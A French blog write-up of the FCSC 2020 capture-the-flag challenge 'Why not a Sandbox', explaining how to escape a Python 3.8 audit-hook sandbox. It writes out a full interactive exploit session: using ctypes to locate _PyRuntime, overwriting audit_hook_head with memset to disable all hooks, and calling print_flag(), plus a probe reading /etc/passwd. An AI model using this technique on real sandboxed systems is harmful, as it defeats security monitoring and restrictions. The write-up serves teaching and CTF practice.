@@ -1,0 +1,53 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>[FR] Write-up FCSC 2020 : Why not a Sandbox - redoste</title><link rel=stylesheet type=text/css href=/css/main.css></head><body><header><a href=https://redoste.xyz/><h2>redoste</h2></a><nav><ul><li><a href=/about/>About</a></li><li><a href=/projects/>Projects</a></li><li><a href=/posts/index.xml>RSS</a></li></ul></nav></header><hr><main><h2>[FR] Write-up FCSC 2020 : Why not a Sandbox</h2><span class=date>2020-05-04 18:00 +0200</span><hr><nav><ul><li><a href=/tags/ctf/>CTF</a></li><li><a href=/tags/fcsc/>FCSC</a></li><li><a href=/tags/fcsc-2020/>FCSC 2020</a></li></ul></nav><hr><h1 id=i---intro>I - Intro</h1><p>Le challenge se compose d&rsquo;un interpréteur Python 3.8.2 avec le quel on peut interagir via une simple connexion TCP obtenable avec <code>netcat</code>. Cet interpréteur modifié va lever une exception lorsque certaine actions sont effectuée. Il est donc impossible d&rsquo;appeler <code>os.system</code> pour obtenir un shell mais aussi d&rsquo;ouvrir un fichier avec <code>open()</code>. Le but est donc d&rsquo;appeler la fonction <code>print_flag()</code> qui à été ajoutée à la librairie principale de python que l&rsquo;ont peut accéder via le module <code>ctypes</code>, celle-ci va aussi lever une exception.</p><pre tabindex=0><code>$ nc challenges1.france-cybersecurity-challenge.fr 4005
+Arriverez-vous à appeler la fonction print_flag ?
+Python 3.8.2 (default, Apr  1 2020, 15:52:55)
+[GCC 9.3.0] on linux
+&gt;&gt;&gt; import os
+Exception ignored in audit hook:
+Exception: Action interdite
+Exception: Module non autorisé
+Traceback (most recent call last):
+  File &#34;&lt;stdin&gt;&#34;, line 1, in &lt;module&gt;
+Exception: Action interdite
+&gt;&gt;&gt; open(&#34;/etc/passwd&#34;, &#34;r&#34;)
+Traceback (most recent call last):
+  File &#34;&lt;stdin&gt;&#34;, line 1, in &lt;module&gt;
+Exception: Action interdite
+&gt;&gt;&gt; import ctypes
+&gt;&gt;&gt; ctypes.pythonapi.print_flag()
+Exception: Nom de fichier interdit
+Traceback (most recent call last):
+  File &#34;&lt;stdin&gt;&#34;, line 1, in &lt;module&gt;
+  File &#34;/usr/lib/python3.8/ctypes/__init__.py&#34;, line 386, in __getattr__
+    func = self.__getitem__(name)
+  File &#34;/usr/lib/python3.8/ctypes/__init__.py&#34;, line 391, in __getitem__
+    func = self._FuncPtr((name_or_ordinal, self))
+Exception: Action interdite
+</code></pre><h1 id=ii---les-audit-hooks>II - Les audit hooks</h1><p>Les exceptions n&rsquo;apparaissent pas toutes de la même manière mais celle de <code>import os</code> indique <code>Exception ignored in audit hook</code>. L&rsquo;exception est donc générée dans un audit hook. Les audit hooks sont une nouvelle fonctionnalité de python 3.8 permettant d&rsquo;exécuter une certaine fonction avant que certain évènements se produisent (Ex: import d&rsquo;un module, appel d&rsquo;une fonction, etc.). Ceux-ci sont définis dans le standard <a href=https://www.python.org/dev/peps/pep-0578/>PEP 578</a>.</p><p>Pour créer un audit hook, la fonction <code>PySys_AddAuditHook()</code> doit être appelée, celle-ci va ajouter le pointeur de fonction passé en paramètre dans une liste chainée commençant par le <a href=https://github.com/python/cpython/blob/62f75fe3dd138f72303814d27183aa469eefcca6/Include/internal/pycore_runtime.h#L105>membre <code>audit_hook_head</code> de la structure <code>_PyRuntimeState</code></a>. Cette structure est utilisée par l&rsquo;objet global principal de l&rsquo;interpréteur Python: <a href=https://github.com/python/cpython/blob/252346acd937ddba4845331994b8ff4f90349625/Python/pylifecycle.c#L66><code>_PyRuntime</code></a>.</p><p>Le but serait donc de mettre le pointeur <code>_PyRuntime.audit_hook_head</code> à <code>NULL</code> de manière à <em>&ldquo;détruire&rdquo;</em> le liste chainée et rendre inefficace tous les audit hooks. Pour cela il faut connaitre l&rsquo;offset du membre <code>audit_hook_head</code> par rapport à <code>_PyRuntime</code>. La manière la plus simple pour le connaitre est de compiler exactement la même version de python que celle du serveur avec le <code>CFLAGS</code> <code>-g</code> de manière à produire un binaire contenant les informations <code>DWARF</code>. On peut ensuite ouvrir cet interpréteur et y attacher un debuggeur pour connaitre l&rsquo;offset voulu.</p><pre tabindex=0><code>(gdb) print &amp;(_PyRuntime.audit_hook_head)
+$1 = (_Py_AuditHookEntry **) 0x788e70 &lt;_PyRuntime+1456&gt;
+</code></pre><p>Donc : <code>&_PyRuntime + 1456 == &(_PyRuntime.audit_hook_head)</code>.</p><h1 id=iii---ctypes>III - <code>ctypes</code></h1><p><code>ctypes</code> est le module python permettant d&rsquo;utiliser des bibliothèques natives, celui-ci n&rsquo;a pas été entièrement blacklisté par le audit hook, on peut donc se servir de certaine de ces fonctions permettant des actions plutôt utiles.</p><p><code>ctypes._CData.from_address()</code> : <code>ctypes</code> possède des classes, toutes héritantes de <code>_CData</code>, représentant différent types de données en C. On peut donc par exemple utiliser <code>ctypes.c_uint64.from_address(0x12345678)</code> pour lire un entier non signé de 64 bits à l&rsquo;adresse <code>0x12345678</code>. Cette fonction permet donc d&rsquo;effectuer des <em>arbitrary write</em> dans l&rsquo;espace d&rsquo;adresse de python.</p><p><code>ctypes.memset()</code> : celle-ci à l&rsquo;avantage d&rsquo;être clair, il s&rsquo;agit de la fonction analogue de <code>memset()</code> en C, on peut donc s&rsquo;en servir pour effectuer des <em>arbitrary writes</em> dans l&rsquo;espace d&rsquo;adresse de python.</p><p><code>ctypes.addressof()</code> : Cette fonction retourne l&rsquo;adresse d&rsquo;un objet python, on peut donc s&rsquo;en servir pour obtenir l&rsquo;adresse de <code>_PyRuntime</code>. Il est à noter que celle-ci revoit bien l&rsquo;adresse de l&rsquo;objet python or <code>ctypes.pythonapi._PyRuntime</code> retournera un <code>_FuncPtr</code> permettant d&rsquo;encapsuler la fonction C (bon ici ce n&rsquo;est pas une fonction mais le principe reste le même), il faudra donc utiliser <code>ctypes.c_uint64.from_address(ctypes.addressof(ctypes.pythonapi._PyRuntime))</code> pour lire le premier membre du <code>_FuncPtr</code> qui correspond à la vrai adresse de <code>_PyRuntime</code>.</p><h1 id=iv---exploitation-finale>IV - Exploitation finale</h1><p>A l&rsquo;aide des informations des paragraphes II et III, on peut facilement déactiver les audit hooks et donc permettre l&rsquo;appel de <code>print_flag()</code> :</p><pre tabindex=0><code>Arriverez-vous à appeler la fonction print_flag ?
+Python 3.8.2 (default, Apr  1 2020, 15:52:55) 
+[GCC 9.3.0] on linux
+&gt;&gt;&gt; import ctypes
+&gt;&gt;&gt; addr_obj_run = ctypes.addressof(ctypes.pythonapi._PyRuntime)
+&gt;&gt;&gt; ctypes.c_uint64.from_address(addr_obj_run)
+c_ulong(140211617380992)
+&gt;&gt;&gt; addr_run = 140211617380992
+&gt;&gt;&gt; ctypes.c_uint64.from_address(addr_run + 1456)
+c_ulong(94195313321648)
+&gt;&gt;&gt; hex(94195313321648)
+&#39;0x55ab8e30a6b0&#39;
+&gt;&gt;&gt; ctypes.memset(addr_run + 1456, 0, 8)
+140211617382448
+&gt;&gt;&gt; ctypes.c_uint64.from_address(addr_run + 1456)
+c_ulong(0)
+&gt;&gt;&gt; open(&#34;&#34;)
+Traceback (most recent call last):
+  File &#34;&lt;stdin&gt;&#34;, line 1, in &lt;module&gt;
+FileNotFoundError: [Errno 2] No such file or directory: &#39;&#39;
+&gt;&gt;&gt; ctypes.pythonapi.print_flag
+&lt;_FuncPtr object at 0x7f858eeeadc0&gt;
+&gt;&gt;&gt; ctypes.pythonapi.print_flag()
+super flag: FCSC{55660e5c9e048d988917e2922eb1130063ebc1030db025a81fd04bda75bab1c3}
+83
+</code></pre></main><hr><footer>© 2020 - 2022 redoste - <a href=https://creativecommons.org/licenses/by/4.0/>CC-BY-4.0</a></footer></body></html>
